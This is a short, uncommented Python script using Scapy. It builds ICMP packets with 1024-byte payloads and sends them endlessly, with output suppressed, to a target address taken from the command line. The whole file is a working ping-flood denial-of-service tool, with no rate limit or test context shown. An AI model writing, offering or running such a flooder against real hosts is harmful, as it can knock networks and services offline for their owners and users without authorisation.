from scapy.all import *

ip = IP(dst=sys.argv[1])
icmp = ICMP()
raw = Raw(b"X"*1024)
p = ip / icmp / raw
send(p, loop=1, verbose=0)
